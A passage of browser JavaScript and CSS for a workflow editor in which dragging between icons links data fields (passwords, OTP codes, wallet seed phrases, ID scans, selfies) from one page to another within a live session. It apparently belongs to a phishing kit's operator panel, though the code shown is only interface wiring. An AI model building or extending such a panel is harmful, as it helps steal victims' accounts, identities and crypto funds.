      .workflow-icon[data-icon-type="username"], .workflow-icon[data-icon-type="identifier"], .workflow-icon[data-icon-type="fullname"], .connection-username, .connection-identifier, .connection-fullname { color: var(--color-identifier-light); }
      .workflow-icon[data-icon-type="recovery_email"], .connection-recovery_email { color: var(--color-recovery-light); }
      .workflow-icon[data-icon-type="recovery_phone"], .connection-recovery_phone { color: var(--color-recovery-light); }
      .workflow-icon[data-icon-type="seed_phrase"], .connection-seed_phrase { color: var(--color-seedphrase-light); }
      .workflow-icon[data-icon-type="seed_backup"], .connection-seed_backup { color: var(--color-seedbackup-light); }
      .workflow-icon[data-icon-type="seed_import"], .connection-seed_import { color: var(--color-seedimport-light); }
      .workflow-icon[data-icon-type="seed"], .connection-seed { color: var(--color-seed-light); } /* Generic seed */
      .workflow-icon[data-icon-type="front_file"], .connection-front_file { color: var(--color-idfront-light); }
      .workflow-icon[data-icon-type="back_file"], .connection-back_file { color: var(--color-idback-light); }
      .workflow-icon[data-icon-type="image_0_file"], .connection-image_0_file { color: var(--color-selfie-light); }
      .workflow-icon[data-icon-type="image_file"], .connection-image_file { color: var(--color-image-light); } /* Generic image */
      .workflow-icon[data-icon-type="activity_form"], .connection-activity_form { color: var(--color-activityform-light); }
      .workflow-icon[data-icon-type="holdings_form"], .connection-holdings_form { color: var(--color-holdingsform-light); }
      .workflow-icon[data-icon-type="activity"], .connection-activity { color: var(--color-activity-light); } /* Generic activity */
      .workflow-icon[data-icon-type="code"], .connection-code { color: var(--color-code-light); } /* New generic code */
      .workflow-icon[data-icon-type="iverifytext"], .connection-iverifytext { color: var(--color-verifytext-light); } /* New verify text */
      .workflow-icon[data-icon-type="countrycodeintl"], .connection-countrycodeintl { color: var(--color-countrycode-light); } /* New country code */
      .workflow-icon[data-icon-type="default"], .connection-default { color: var(--color-default-light); }
  
      /* Icon Foreground Colors - Dark Mode */
      html.dark {
         --workflow-provider-shadow: rgba(102, 187, 106, 0.6);
         --workflow-consumer-shadow: rgba(66, 165, 245, 0.6);
      }
      html.dark .workflow-icon[data-icon-type="email"], html.dark .connection-email { color: var(--color-email-dark); }
      html.dark .workflow-icon[data-icon-type="password"], html.dark .connection-password { color: var(--color-password-dark); }
      html.dark .workflow-icon[data-icon-type="current-password"], html.dark .connection-current-password { color: var(--color-currentpassword-dark); }
      html.dark .workflow-icon[data-icon-type="new-password"], html.dark .connection-new-password { color: var(--color-newpassword-dark); }
      html.dark .workflow-icon[data-icon-type="phone"], html.dark .workflow-icon[data-icon-type="phonenumb"], html.dark .connection-phone, html.dark .connection-phonenumb { color: var(--color-phone-dark); }
      html.dark .workflow-icon[data-icon-type="2facode"], html.dark .workflow-icon[data-icon-type="otpcode"], html.dark .workflow-icon[data-icon-type="securitycode"], html.dark .connection-2facode, html.dark .connection-otpcode, html.dark .connection-securitycode { color: var(--color-otpcode-dark); }
      html.dark .workflow-icon[data-icon-type="username"], html.dark .workflow-icon[data-icon-type="identifier"], html.dark .workflow-icon[data-icon-type="fullname"], html.dark .connection-username, html.dark .connection-identifier, html.dark .connection-fullname { color: var(--color-identifier-dark); }
      html.dark .workflow-icon[data-icon-type="recovery_email"], html.dark .connection-recovery_email { color: var(--color-recovery-dark); }
      html.dark .workflow-icon[data-icon-type="recovery_phone"], html.dark .connection-recovery_phone { color: var(--color-recovery-dark); }
      html.dark .workflow-icon[data-icon-type="seed_phrase"], html.dark .connection-seed_phrase { color: var(--color-seedphrase-dark); }
      html.dark .workflow-icon[data-icon-type="seed_backup"], html.dark .connection-seed_backup { color: var(--color-seedbackup-dark); }
      html.dark .workflow-icon[data-icon-type="seed_import"], html.dark .connection-seed_import { color: var(--color-seedimport-dark); }
      html.dark .workflow-icon[data-icon-type="seed"], html.dark .connection-seed { color: var(--color-seed-dark); } /* Generic seed */
      html.dark .workflow-icon[data-icon-type="front_file"], html.dark .connection-front_file { color: var(--color-idfront-dark); }
      html.dark .workflow-icon[data-icon-type="back_file"], html.dark .connection-back_file { color: var(--color-idback-dark); }
      html.dark .workflow-icon[data-icon-type="image_0_file"], html.dark .connection-image_0_file { color: var(--color-selfie-dark); }
      html.dark .workflow-icon[data-icon-type="image_file"], html.dark .connection-image_file { color: var(--color-image-dark); } /* Generic image */
      html.dark .workflow-icon[data-icon-type="activity_form"], html.dark .connection-activity_form { color: var(--color-activityform-dark); }
      html.dark .workflow-icon[data-icon-type="holdings_form"], html.dark .connection-holdings_form { color: var(--color-holdingsform-dark); }
      html.dark .workflow-icon[data-icon-type="activity"], html.dark .connection-activity { color: var(--color-activity-dark); } /* Generic activity */
      html.dark .workflow-icon[data-icon-type="code"], html.dark .connection-code { color: var(--color-code-dark); } /* New generic code */
      html.dark .workflow-icon[data-icon-type="iverifytext"], html.dark .connection-iverifytext { color: var(--color-verifytext-dark); } /* New verify text */
      html.dark .workflow-icon[data-icon-type="countrycodeintl"], html.dark .connection-countrycodeintl { color: var(--color-countrycode-dark); } /* New country code */
      html.dark .workflow-icon[data-icon-type="default"], html.dark .connection-default { color: var(--color-default-dark); }
      `;
      document.head.appendChild(style);
      ensureConnectionContainer();
    document.addEventListener('mousedown', handleGlobalMouseDown, true);
    document.addEventListener('mousemove', handleGlobalMouseMove);
    document.addEventListener('mouseup', handleGlobalMouseUp);
    
    const workflowContainer = document.getElementById('workflowMainList');
    const workflowInfoContainer = document.getElementById('workflowPagesDisplay');
    
    const handleContainerMouseLeave = function() {
        if (activeConnection) {
            cleanupConnection();
            activeConnection = null;
        }
    };
    
    if (workflowContainer) {
        workflowContainer.addEventListener('mouseleave', handleContainerMouseLeave);
    }
    
    if (workflowInfoContainer) {
        workflowInfoContainer.addEventListener('mouseleave', handleContainerMouseLeave);
    }
    
    document.addEventListener('click', function(e) {
        if (activeConnection) {
            const clickedElement = document.elementFromPoint(e.clientX, e.clientY);
            if (!clickedElement || !clickedElement.closest('.workflow-icon')) {
                cleanupConnection();
            }
        }
    });
    
    scanForIcons();
    setupWorkflowObserver();
}

function ensureConnectionContainer() {
  const workflowContainer = document.getElementById('workflowMainList');
  const workflowInfoContainer = document.getElementById('workflowPagesDisplay');

  if (!connectionLine) {
      connectionLine = document.createElement('div');
      connectionLine.id = 'draggableIconLine';
      connectionLine.style.display = 'none';
      document.body.appendChild(connectionLine);
  }

  if (workflowContainer) {
      workflowContainer.style.position = 'relative';
      let connectionContainer = document.getElementById('connectionContainer');
      if (!connectionContainer) {
          connectionContainer = document.createElement('div');
          connectionContainer.id = 'connectionContainer';
          connectionContainer.style.position = 'absolute';
          connectionContainer.style.inset = '0';
          connectionContainer.style.pointerEvents = 'none';
          workflowContainer.appendChild(connectionContainer);
      }
  }

  if (workflowInfoContainer) {
      workflowInfoContainer.style.position = 'relative';
      let infoConnectionContainer = document.getElementById('infoConnectionContainer');
      if (!infoConnectionContainer) {
          infoConnectionContainer = document.createElement('div');
          infoConnectionContainer.id = 'infoConnectionContainer';
          infoConnectionContainer.style.position = 'absolute';
          infoConnectionContainer.style.inset = '0';
          infoConnectionContainer.style.pointerEvents = 'none';
          workflowInfoContainer.appendChild(infoConnectionContainer);
      }
  }
  const sourceIcon = activeConnection?.sourceIcon;
  if (sourceIcon) {
      return sourceIcon.closest('#workflowPagesDisplay') ? 
          document.getElementById('infoConnectionContainer') : 
          document.getElementById('connectionContainer');
  }
  return document.getElementById('connectionContainer');
}

    function handleGlobalMouseDown(e) {
       if (e.button !== 0) return;
       const targetElements = document.elementsFromPoint(e.clientX, e.clientY);
       const icon = targetElements.find(el => el.classList.contains('workflow-icon') && el.dataset.iconSystemInitialized === 'true');
       if (icon) {
          e.stopPropagation();
          e.preventDefault();
          if (activeConnection) {
             handleConnection(icon);
          } else {
             startConnection(icon);
          }
       }
    }

    function handleConnection(targetIcon) {
      if (!activeConnection || !targetIcon) return;
      
      processConnection(activeConnection.sourceIcon, targetIcon);
  
      async function processConnection(sourceIcon, targetIcon) {
          if (!sourceIcon || !targetIcon) {
              cleanupConnection();
              return;
          }
      
          const sourceTitle = sourceIcon.getAttribute('title');
          const targetTitle = targetIcon.getAttribute('title');
          const sourceDataType = sourceIcon.dataset.iconType;
          const targetDataType = targetIcon.dataset.iconType;
      
          const isWorkflowInfo = isInWorkflowInfo(sourceIcon) && isInWorkflowInfo(targetIcon);
      
          if (sourceDataType === targetDataType) {
              const sourceCard = sourceIcon.closest('.workflow-card, .card-preview');
              const targetCard = targetIcon.closest('.workflow-card, .card-preview');
      
              if (!sourceCard || !targetCard) {
                  showToast('Cannot determine page data', 'error');
                  cleanupConnection();
                  return;
              }
      
              const sourcePageId = sourceCard.dataset.id?.replace(/^\/+/, '');
              const targetPageId = targetCard.dataset.id?.replace(/^\/+/, '');
              const isSourceProvider = sourceTitle.startsWith('Receives:');
              const isTargetRequirer = targetTitle.startsWith('Required:');
      
              if (!isWorkflowInfo) {
                  const workflowMainList = document.getElementById('workflowMainList');
                  const sourceInMain = sourceCard.closest('#workflowMainList');
                  const targetInMain = targetCard.closest('#workflowMainList');
                  
                  if (sourceInMain && targetInMain && workflowMainList) {
                      const allCards = Array.from(workflowMainList.querySelectorAll('.workflow-card'));
                      const sourceIndex = allCards.findIndex(card => card.dataset.id?.replace(/^\/+/, '') === sourcePageId);
                      const targetIndex = allCards.findIndex(card => card.dataset.id?.replace(/^\/+/, '') === targetPageId);
      
                      if (sourceIndex !== -1 && targetIndex !== -1 && sourceIndex >= targetIndex) {
                          showToast(`Cannot connect: \"${sourcePageId}\" must be before \"${targetPageId}\" in the workflow`, 'error');
                          cleanupConnection();
                          return;
                      }
                  }
              }
      
              if (isSourceProvider && isTargetRequirer) {
                  let placeholderName = "placeholder";
                  let formValue = sourceDataType;
      
                  try {
                      const response = await fetch('api/v1/config');
                      const config = await response.json();
      
                      if (isWorkflowInfo) {
                          const existingLink = config.data_links?.find(link => 
                              (link.from === sourcePageId && link.to === targetPageId && 
                               link.from_value === sourceDataType) ||
                              (link.from === targetPageId && link.to === sourcePageId && 
                               link.from_value === sourceDataType)
                          );
      
                          if (existingLink) {
                              
                              const connectionContainer = document.getElementById('infoConnectionContainer');
                              if (connectionContainer) {
                                  const existingLine = connectionContainer.querySelector(
                                      `.icon-connection[data-source="${existingLink.from}"][data-target="${existingLink.to}"][data-type="${existingLink.from_value}"], ` +
                                      `.icon-connection[data-source="${existingLink.to}"][data-target="${existingLink.from}"][data-type="${existingLink.from_value}"]`
                                  );
                                  if (existingLine) {
                                      existingLine.remove();
                                  }
                              }
      
                              socket.emit('update_data_links', {
                                  action: 'remove',
                                  link: existingLink
                              });
      
                              showToast(`Connection removed between ${sourcePageId} and ${targetPageId}`, 'info');
                              cleanupConnection();
                              return;
                          }
      
                          const connectionContainer = document.getElementById('infoConnectionContainer') || ensureConnectionContainer();
                          if (!connectionContainer) {
                              cleanupConnection();
                              return;
                          }
      
                          const connection = createConnectionElement(sourceIcon, targetIcon, sourcePageId, targetPageId, sourceDataType, connectionContainer);
                          
                          connection.dataset.source = sourcePageId;
                          connection.dataset.target = targetPageId;
                          connection.dataset.type = sourceDataType;
                          
                          socket.emit('update_data_links', {
                              action: 'add',
                              link: {
                                  from: sourcePageId,
                                  from_value: sourceDataType,
                                  to: targetPageId,
                                  to_value: sourceDataType
                              }
                          });
      
                          showToast(`Connected: ${sourcePageId} provides ${sourceDataType} to ${targetPageId}`, 'success');
                      } else {
                          if (config.pages && config.pages[targetPageId]) {
                              const targetPage = config.pages[targetPageId];
      
                              if (targetPage.panel && targetPage.panel.input && targetPage.panel.input.required_data) {
                                  const requiredData = targetPage.panel.input.required_data;
                                  const matchingField = requiredData.find(field => 
                                      field.value === targetDataType || 
                                      field.placeholder_name === targetDataType
                                  );
                                  
                                  if (matchingField) {
                                      placeholderName = matchingField.placeholder_name || matchingField.value;
                                  }
                              }
                          }
                          if (config.pages && config.pages[sourcePageId] && config.pages[sourcePageId].form) {
                              const formData = config.pages[sourcePageId].form;
      
                              if (formData[sourceDataType]) {
                                  formValue = formData[sourceDataType];
                              }
                          }
      
                          const existingConnection = findConnection(sourceIcon, targetIcon) || findConnection(targetIcon, sourceIcon);
      
                          if (existingConnection) {
                              if (existingConnection.element && existingConnection.element.parentNode) {
                                  existingConnection.element.parentNode.removeChild(existingConnection.element);
                              }
                              
                              socket.emit('workflow_remove_link', {
                                  from: sourcePageId,
                                  to: targetPageId,
                                  from_value: formValue,
                                  to_value: placeholderName,
                                  session_id: state.selectedSession.id
                              });
                              
                              connections = connections.filter(conn => conn !== existingConnection);
                              showToast(`Connection removed between ${sourcePageId} and ${targetPageId}`, 'info');
                          } else {
                              const container = document.getElementById('connectionContainer');
                              const connection = createConnectionElement(sourceIcon, targetIcon, sourcePageId, targetPageId, sourceDataType, container);
                              if (connection) {
                                  socket.emit('workflow_create_link', {
                                      from: sourcePageId,
                                      to: targetPageId,
                                      from_value: formValue,
                                      to_value: placeholderName,
                                      session_id: state.selectedSession.id
                                  });
                                  
                                  showToast(`Connected: ${sourcePageId} provides ${sourceDataType} to ${targetPageId}`, 'success');
                              }
                          }
                      }
                  } catch (error) {
                      showToast('Error processing connection', 'error');
                  }
              } else {
                  showToast('Invalid connection: Source must be a provider and target must be a requirer', 'error');
              }
          } else {
              showToast('Cannot connect different data types', 'error');
          }
      
          cleanupConnection();
      }
  }

    function cleanupConnection() {
      connectionLine.style.display = 'none';
      
      if (activeConnection && activeConnection.sourceIcon) {
          activeConnection.sourceIcon.style.removeProperty('box-shadow');
          activeConnection.sourceIcon.classList.remove(`connection-${activeConnection.iconType}`);
          
          if (activeConnection.iconBackgroundType) {
              activeConnection.sourceIcon.classList.remove(`bg-${activeConnection.iconBackgroundType}`);
          }
      }
      
      activeConnection = null;
  }

  function createConnectionElement(sourceIcon, targetIcon, sourcePageId, targetPageId, dataType, container) {
    
    const sourceRect = sourceIcon.getBoundingClientRect();
    const targetRect = targetIcon.getBoundingClientRect();
    const containerRect = container.getBoundingClientRect();

    const sourceX = (sourceRect.left + window.scrollX) + sourceRect.width / 2 - (containerRect.left + window.scrollX);
    const sourceY = (sourceRect.top + window.scrollY) + sourceRect.height / 2 - (containerRect.top + window.scrollY);
    const targetX = (targetRect.left + window.scrollX) + targetRect.width / 2 - (containerRect.left + window.scrollX);
    const targetY = (targetRect.top + window.scrollY) + targetRect.height / 2 - (containerRect.top + window.scrollY);

    const dx = targetX - sourceX;
    const dy = targetY - sourceY;
    const length = Math.sqrt(dx * dx + dy * dy);
    const angle = Math.atan2(dy, dx) * 180 / Math.PI;
    
    const connection = document.createElement('div');
    connection.className = 'icon-connection';
    connection.classList.add(`connection-${dataType}`);
    
    connection.style.position = 'absolute';
    connection.style.left = sourceX + 'px';
    connection.style.top = sourceY + 'px';
    connection.style.width = length + 'px';
    connection.style.transform = `rotate(${angle}deg)`;
    
    const iconWrapper = sourceIcon.closest('.icon-wrapper');
    
    if (iconWrapper) {
        const iconTypeClass = Array.from(iconWrapper.classList)
            .find(cls => cls.startsWith('icon-type-'));
        
        if (iconTypeClass) {
            const iconType = iconTypeClass.replace('icon-type-', '');
            
            connection.style.setProperty('background-color', `var(--icon-bg-${iconType})`, 'important');
            connection.style.setProperty('height', '3px', 'important');
            connection.style.setProperty('opacity', '1', 'important');
            
            sourceIcon.style.setProperty('box-shadow', `0 0 0 3px var(--icon-bg-${iconType})`, 'important');
            targetIcon.style.setProperty('box-shadow', `0 0 0 3px var(--icon-bg-${iconType})`, 'important');
            
            setTimeout(() => {
                sourceIcon.style.removeProperty('box-shadow');
                targetIcon.style.removeProperty('box-shadow');
            }, 800);
        }
    }
    
    container.appendChild(connection);

    const containerId = container.id;
    
    connections.push({
        source: sourceIcon,
        target: targetIcon,
        element: connection,
        dataType: dataType,
        sourcePageId: sourcePageId,
        targetPageId: targetPageId,
        containerId: containerId
    });
    
    
    const workflowMainList = document.getElementById('workflowMainList');
    
    if (workflowMainList && sourceIcon.closest('#' + containerId)) {
        const originalSourceCard = sourceIcon.closest('.workflow-card, .card-preview');
        const originalTargetCard = targetIcon.closest('.workflow-card, .card-preview');
        
        
        const sourceCards = Array.from(
            workflowMainList.querySelectorAll(`.workflow-card[data-id="${sourcePageId}"], .card-preview[data-id="${sourcePageId}"]`)
        ).filter(card => card !== originalSourceCard && card.closest('#' + containerId));
        
        
        sourceCards.forEach((sourceCard, index) => {
            
            let duplicateSourceIcon = null;
            const sourceIcons = sourceCard.querySelectorAll('.workflow-icon');
            
            sourceIcons.forEach(icon => {
                const title = icon.getAttribute('title') || '';
                const iconType = icon.getAttribute('data-icon-type') || title.split(':')[1]?.trim();
                const isProvider = title.startsWith('Receives:');
                
                
                if (iconType === dataType && isProvider) {
                    duplicateSourceIcon = icon;
                }
            });
            
            if (duplicateSourceIcon) {
                
                const duplicateSourceRect = duplicateSourceIcon.getBoundingClientRect();
                const dupSourceX = (duplicateSourceRect.left + window.scrollX) + duplicateSourceRect.width / 2 - (containerRect.left + window.scrollX);
                const dupSourceY = (duplicateSourceRect.top + window.scrollY) + duplicateSourceRect.height / 2 - (containerRect.top + window.scrollY);
                
                const dxDuplicate = targetX - dupSourceX;
                const dyDuplicate = targetY - dupSourceY;
                const lengthDuplicate = Math.sqrt(dxDuplicate * dxDuplicate + dyDuplicate * dyDuplicate);
                const angleDuplicate = Math.atan2(dyDuplicate, dxDuplicate) * 180 / Math.PI;
                
                const duplicateConnection = document.createElement('div');
                duplicateConnection.className = 'icon-connection';
                duplicateConnection.classList.add(`connection-${dataType}`);
                
                duplicateConnection.style.position = 'absolute';
                duplicateConnection.style.left = dupSourceX + 'px';
                duplicateConnection.style.top = dupSourceY + 'px';
                duplicateConnection.style.width = lengthDuplicate + 'px';
                duplicateConnection.style.transform = `rotate(${angleDuplicate}deg)`;
                
                if (iconWrapper) {
                    const iconTypeClass = Array.from(iconWrapper.classList)
                        .find(cls => cls.startsWith('icon-type-'));
                    
                    if (iconTypeClass) {
                        const iconType = iconTypeClass.replace('icon-type-', '');
                        duplicateConnection.style.setProperty('background-color', `var(--icon-bg-${iconType})`, 'important');
                        duplicateConnection.style.setProperty('height', '3px', 'important');
                        duplicateConnection.style.setProperty('opacity', '1', 'important');
                    }
                }
                
                container.appendChild(duplicateConnection);
                connections.push({
                    source: duplicateSourceIcon,
                    target: targetIcon,
                    element: duplicateConnection,
                    dataType: dataType,
                    sourcePageId: sourcePageId,
                    targetPageId: targetPageId,
                    containerId: containerId
                });
                
            } else {
            }
        });
        
        const targetCards = Array.from(
            workflowMainList.querySelectorAll(`.workflow-card[data-id="${targetPageId}"], .card-preview[data-id="${targetPageId}"]`)
        ).filter(card => card !== originalTargetCard && card.closest('#' + containerId));
        
        
        targetCards.forEach((targetCard, index) => {
            
            let duplicateTargetIcon = null;
            const targetIcons = targetCard.querySelectorAll('.workflow-icon');
            
            targetIcons.forEach(icon => {
                const title = icon.getAttribute('title') || '';
                const iconType = icon.getAttribute('data-icon-type') || title.split(':')[1]?.trim();
                const isRequirer = title.startsWith('Required:');
                
                
                if (iconType === dataType && isRequirer) {
                    duplicateTargetIcon = icon;
                }
            });
            
            if (duplicateTargetIcon) {
                
                const duplicateTargetRect = duplicateTargetIcon.getBoundingClientRect();
                const dupTargetX = (duplicateTargetRect.left + window.scrollX) + duplicateTargetRect.width / 2 - (containerRect.left + window.scrollX);
                const dupTargetY = (duplicateTargetRect.top + window.scrollY) + duplicateTargetRect.height / 2 - (containerRect.top + window.scrollY);
                
                const dxDuplicate = dupTargetX - sourceX;
                const dyDuplicate = dupTargetY - sourceY;
                const lengthDuplicate = Math.sqrt(dxDuplicate * dxDuplicate + dyDuplicate * dyDuplicate);
                const angleDuplicate = Math.atan2(dyDuplicate, dxDuplicate) * 180 / Math.PI;
                
                const duplicateConnection = document.createElement('div');
                duplicateConnection.className = 'icon-connection';
                duplicateConnection.classList.add(`connection-${dataType}`);
                
                duplicateConnection.style.position = 'absolute';
                duplicateConnection.style.left = sourceX + 'px';
                duplicateConnection.style.top = sourceY + 'px';
                duplicateConnection.style.width = lengthDuplicate + 'px';
                duplicateConnection.style.transform = `rotate(${angleDuplicate}deg)`;
                
                if (iconWrapper) {
                    const iconTypeClass = Array.from(iconWrapper.classList)
                        .find(cls => cls.startsWith('icon-type-'));
                    
                    if (iconTypeClass) {
                        const iconType = iconTypeClass.replace('icon-type-', '');
                        duplicateConnection.style.setProperty('background-color', `var(--icon-bg-${iconType})`, 'important');
                        duplicateConnection.style.setProperty('height', '3px', 'important');
                        duplicateConnection.style.setProperty('opacity', '1', 'important');
                    }
                }
                
                container.appendChild(duplicateConnection);
                connections.push({
                    source: sourceIcon,
                    target: duplicateTargetIcon,
                    element: duplicateConnection,
                    dataType: dataType,
                    sourcePageId: sourcePageId,
                    targetPageId: targetPageId,
                    containerId: containerId
                });
                
            } else {
            }
        });
        
        if (sourceCards.length > 0 && targetCards.length > 0) {
            
            sourceCards.forEach((sourceCard, sIndex) => {
                
                let duplicateSourceIcon = null;
                sourceCard.querySelectorAll('.workflow-icon').forEach(icon => {
                    const title = icon.getAttribute('title') || '';
                    const iconType = icon.getAttribute('data-icon-type') || title.split(':')[1]?.trim();
                    const isProvider = title.startsWith('Receives:');
                    
                    if (iconType === dataType && isProvider) {
                        duplicateSourceIcon = icon;
                    }
                });
                
                if (duplicateSourceIcon) {
                    targetCards.forEach((targetCard, tIndex) => {
                        
                        let duplicateTargetIcon = null;
                        targetCard.querySelectorAll('.workflow-icon').forEach(icon => {
                            const title = icon.getAttribute('title') || '';
                            const iconType = icon.getAttribute('data-icon-type') || title.split(':')[1]?.trim();
                            const isRequirer = title.startsWith('Required:');
                            
                            if (iconType === dataType && isRequirer) {
                                duplicateTargetIcon = icon;
                            }
                        });
                        
                        if (duplicateTargetIcon) {
                            
                            const dupSourceRect = duplicateSourceIcon.getBoundingClientRect();
                            const dupTargetRect = duplicateTargetIcon.getBoundingClientRect();
                            
                            const dupSourceX = (dupSourceRect.left + window.scrollX) + dupSourceRect.width / 2 - (containerRect.left + window.scrollX);
                            const dupSourceY = (dupSourceRect.top + window.scrollY) + dupSourceRect.height / 2 - (containerRect.top + window.scrollY);
                            const dupTargetX = (dupTargetRect.left + window.scrollX) + dupTargetRect.width / 2 - (containerRect.left + window.scrollX);
                            const dupTargetY = (dupTargetRect.top + window.scrollY) + dupTargetRect.height / 2 - (containerRect.top + window.scrollY);
                            
                            const dxDup = dupTargetX - dupSourceX;
                            const dyDup = dupTargetY - dupSourceY;
                            const lengthDup = Math.sqrt(dxDup * dxDup + dyDup * dyDup);
                            const angleDup = Math.atan2(dyDup, dxDup) * 180 / Math.PI;
                            
                            const dupConnection = document.createElement('div');
                            dupConnection.className = 'icon-connection';
                            dupConnection.classList.add(`connection-${dataType}`);
                            
                            dupConnection.style.position = 'absolute';
                            dupConnection.style.left = dupSourceX + 'px';
                            dupConnection.style.top = dupSourceY + 'px';
                            dupConnection.style.width = lengthDup + 'px';
                            dupConnection.style.transform = `rotate(${angleDup}deg)`;
                            
                            if (iconWrapper) {
                                const iconTypeClass = Array.from(iconWrapper.classList)
                                    .find(cls => cls.startsWith('icon-type-'));
                                
                                if (iconTypeClass) {
                                    const iconType = iconTypeClass.replace('icon-type-', '');
                                    dupConnection.style.setProperty('background-color', `var(--icon-bg-${iconType})`, 'important');
                                    dupConnection.style.setProperty('height', '3px', 'important');
                                    dupConnection.style.setProperty('opacity', '1', 'important');
                                }
                            }
                            
                            container.appendChild(dupConnection);
                            connections.push({
                                source: duplicateSourceIcon,
                                target: duplicateTargetIcon,
                                element: dupConnection,
                                dataType: dataType,
                                sourcePageId: sourcePageId,
                                targetPageId: targetPageId,
                                containerId: containerId
                            });
                            
                        } else {
                        }
                    });
                } else {
                }
            });
        }
    } else {
    }
    
    return connection;
}

function setupWorkflowObserver() {
  const workflowList = document.getElementById('workflowMainList');
  const workflowInfo = document.getElementById('workflowPagesDisplay');
  
  if (window.iconConnectionObserver) {
      window.iconConnectionObserver.disconnect();
  }
  
  window.iconConnectionObserver = new MutationObserver(mutations => {
      let needsUpdate = false;
      mutations.forEach(mutation => {
          if (mutation.type === 'childList' || (mutation.type === 'attributes' && mutation.attributeName === 'style')) {
              needsUpdate = true;
          }
      });
      if (needsUpdate) {
          setTimeout(() => {
              scanForIcons();
              updateConnections();
          }, 100);
      }
  });

  if (workflowList) {
      window.iconConnectionObserver.observe(workflowList, {
          childList: true,
          subtree: true,
          attributes: true
      });
  }
  
  if (workflowInfo) {
      window.iconConnectionObserver.observe(workflowInfo, {
          childList: true,
          subtree: true,
          attributes: true
      });
  }
}

 function scanForIcons(specificPageId = null) {
  let icons;
  if (specificPageId) {
      const pageElement = document.querySelector(`[data-id="${specificPageId}"]`);
      icons = pageElement ? pageElement.querySelectorAll('.workflow-icon') : [];
  } else {
      icons = document.querySelectorAll('#workflowMainList .workflow-icon, #workflowPagesDisplay .workflow-icon');
  }
  
  icons.forEach((icon, index) => {
      if (!icon.dataset.iconSystemInitialized) {
          icon.dataset.iconSystemInitialized = 'true';
          icon.classList.add('workflowIcon-draggable');
          const iconTitle = icon.getAttribute('title') || '';
          const iconType = iconTitle.split(':')[1]?.trim() || 'default';
          if (iconType) icon.dataset.iconType = iconType;
          
          let wrapper = icon.querySelector('.icon-wrapper');
          const svgg = icon.querySelector('svg');
          if (svgg && !wrapper) {
              wrapper = document.createElement('span');
              wrapper.className = 'icon-wrapper';
              icon.insertBefore(wrapper, svgg);
              wrapper.appendChild(svgg);
              if(svgg) svgg.style.pointerEvents = 'none';
          } else if (svgg) {
              wrapper = svgg.parentElement.classList.contains('icon-wrapper') ? svgg.parentElement : null;
              if(svgg) svgg.style.pointerEvents = 'none';
          }

          if (wrapper) {
              wrapper.classList.remove('icon-provider', 'icon-consumer');
              if (iconTitle.toLowerCase().startsWith('receives:')) {
                  wrapper.classList.add('icon-provider');
              } else if (iconTitle.toLowerCase().startsWith('required:')) {
                  wrapper.classList.add('icon-consumer');
              }

              const dataTypeClass = `icon-type-${iconType.toLowerCase().replace(/[^a-z0-9]/g, '') || 'default'}`;
              const classList = Array.from(wrapper.classList);
              for (const cls of classList) {
                  if (cls.startsWith('icon-type-')) {
                      wrapper.classList.remove(cls);
                  }
              }
              wrapper.classList.add(dataTypeClass); 

          } else {
          }

          if (iconType) {
              icon.dataset.iconType = iconType;
              
              const getIconCategory = (type) => {
                  if (type.includes('email') || type === 'eml' || type === 'recovery_email') return 'email';
                  if (type.includes('password') || type === 'pss' || type === 'passwd' || type === 'current' || type.includes('currentpassword')) return 'password';
                  if (type.includes('phone') || type === 'phn' || type === 'recovery_phone') return 'phone';
                  if (type.includes('otp') || type.includes('security')) return 'otpcode';
                  if (type.includes('identifier') || type.includes('username') || type.includes('fullname') || type === 'user') return 'identifier';
                  if (type.includes('seed') || type.includes('wallet')) return 'seed';
                  if (type.includes('file') || type.includes('image')) return 'image';
                  if (type.includes('form') || type.includes('activity') || type.includes('holding')) return 'activity';
                  if (type.includes('recovery')) return 'recovery';
                  return 'default';
              };
              
              const iconCategory = getIconCategory(iconType.toLowerCase());
              icon.classList.add(`icon-type-${iconCategory}`);
          }
          
          const svg = icon.querySelector('svg');
          if (svg && !svg.parentElement.classList.contains('icon-wrapper')) {
              const wrapper = document.createElement('span');
              wrapper.className = 'icon-wrapper';
              
              icon.insertBefore(wrapper, svg);
              wrapper.appendChild(svg);
              
              svg.style.pointerEvents = 'none';
          } else if (svg) {
              svg.style.pointerEvents = 'none';
          }
          
          icon.addEventListener('click', function(e) {
              e.stopPropagation();
              e.preventDefault();
              if (activeConnection) {
                  handleConnection(this);
              } else {
                  startConnection(this);
              }
          }, true);
      }
  });
  updateConnections();
  
  const event = new CustomEvent('workflow-icons-ready', { 
      detail: { 
          pageId: specificPageId,
          iconsScanned: icons.length
      }
  });
  document.dispatchEvent(event);
}

  function startConnection(sourceIcon) {
    const rect = sourceIcon.getBoundingClientRect();
    const startX = rect.left + rect.width / 2;
    const startY = rect.top + rect.height / 2;
    connectionLine.style.left = startX + 'px';
    connectionLine.style.top = startY + 'px';
    connectionLine.style.width = '0px';
    connectionLine.style.transform = 'rotate(0deg)';
    connectionLine.style.display = 'block';
    
    const iconWrapper = sourceIcon.querySelector('.icon-wrapper');
    let iconType = 'default';
    
    if (iconWrapper) {
        const iconTypeClass = Array.from(iconWrapper.classList)
            .find(cls => cls.startsWith('icon-type-'));
        
        if (iconTypeClass) {
            iconType = iconTypeClass.replace('icon-type-', '');
            
            connectionLine.style.setProperty('background-color', `var(--icon-bg-${iconType})`, 'important');
            connectionLine.style.setProperty('height', '3px', 'important');
            connectionLine.style.setProperty('opacity', '1', 'important');
            
        }
    }
    
    const dataType = sourceIcon.dataset.iconType || 'default';
    connectionLine.className = 'connection-' + dataType;
    
    activeConnection = {
        sourceIcon: sourceIcon,
        iconType: dataType,
        iconBackgroundType: iconType, 
        startX: startX,
        startY: startY
    };
    
    sourceIcon.style.setProperty('box-shadow', `0 0 0 3px var(--icon-bg-${iconType})`, 'important');
    sourceIcon.classList.add(`connection-${dataType}`);
}

function handleGlobalMouseMove(e) {
  if (!activeConnection) return;
  
  const sourceIconRect = activeConnection.sourceIcon.getBoundingClientRect();
  const updatedStartX = sourceIconRect.left + sourceIconRect.width / 2;
  const updatedStartY = sourceIconRect.top + sourceIconRect.height / 2;
  
  connectionLine.style.left = updatedStartX + 'px';
  connectionLine.style.top = updatedStartY + 'px';
  
  const dx = e.clientX - updatedStartX;
  const dy = e.clientY - updatedStartY;
  const length = Math.sqrt(dx * dx + dy * dy);
  const angle = Math.atan2(dy, dx) * 180 / Math.PI;
  
  connectionLine.style.width = length + 'px';
  connectionLine.style.transform = `rotate(${angle}deg)`;
  
  if (activeConnection.iconBackgroundType) {
      connectionLine.style.setProperty('background-color', 
